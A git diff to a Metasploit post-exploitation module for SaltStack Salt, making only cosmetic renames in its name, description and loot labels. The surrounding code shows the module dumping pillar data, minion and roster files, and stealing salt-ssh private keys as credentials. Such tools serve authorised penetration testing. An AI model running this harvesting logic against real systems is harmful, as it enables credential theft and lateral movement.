@@ -12,9 +12,9 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'SaltStack Information Gatherer',
+        'Name' => 'SaltStack Salt Information Gatherer',
         'Description' => %q{
-          This module gathers information from SaltStack masters and minions.
+          This module gathers information from SaltStack Salt masters and minions.
           Data gathered from minions: 1. salt minion config file
           Data gathered from masters: 1. minion list (denied, pre, rejected, accepted)
           2. minion hostname/ip/os (depending on module settings)
@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
       out = cmd_exec('salt', "'#{datastore['MINIONS']}' --output=yaml pillar.items", datastore['TIMEOUT'])
       vprint_status(out)
       results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
-      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Pillar Gather')
+      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')
       print_good("#{peer} - pillar data gathering successfully retrieved and saved to #{store_path}")
     rescue Psych::SyntaxError
       print_error('Unable to process pillar command output')
@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Post
       end
       vprint_status(out)
       results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
-      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Minion Data Gather')
+      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')
       print_good("#{peer} - minion data gathering successfully retrieved and saved to #{store_path}")
     rescue Psych::SyntaxError
       print_error('Unable to process gather command output')
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
       host_info = {
         name: result['network.get_hostname'],
         os_flavor: result['status.version'],
-        comments: "SaltStack minion to #{session.session_host}"
+        comments: "SaltStack Salt minion to #{session.session_host}"
       }
       # mac os
       if result.key?('system.get_system_info') &&
@@ -155,7 +155,7 @@ class MetasploitModule < Msf::Post
       'Columns' => ['Status', 'Minion Name']
     )
 
-    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack salt-key list')
+    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack Salt salt-key list')
     print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
     minions['minions'].each do |minion|
       tbl << ['Accepted', minion]
@@ -186,7 +186,7 @@ class MetasploitModule < Msf::Post
       if minion['master']
         print_good("Minion master: #{minion['master']}")
       end
-      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Minion File')
+      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Salt Minion File')
       print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
       break # no need to process more
     end
@@ -203,7 +203,7 @@ class MetasploitModule < Msf::Post
     end
     print_status('Showing SLS')
     output = cmd_exec('salt', "'#{datastore['MINIONS']}' state.show_sls '*'", datastore['TIMEOUT'])
-    store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Master SLS Output')
+    store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
     print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")
 
     # get roster
@@ -241,7 +241,7 @@ class MetasploitModule < Msf::Post
 
         host_info = {
           name: name,
-          comments: "SaltStack ssh minion to #{session.session_host}",
+          comments: "SaltStack Salt ssh minion to #{session.session_host}",
           host: host
         }
         report_host(host_info)
@@ -277,13 +277,13 @@ class MetasploitModule < Msf::Post
           next
         end
         input = read_file(priv)
-        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack SSH Private Key')
+        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack Salt SSH Private Key')
         print_good("  #{priv} stored to #{store_path}")
         priv_values[priv] = input
         cred[:private_data] = input
         create_credential_and_login(cred)
       end
-      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Roster File')
+      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
       print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
     end
     gather_pillars
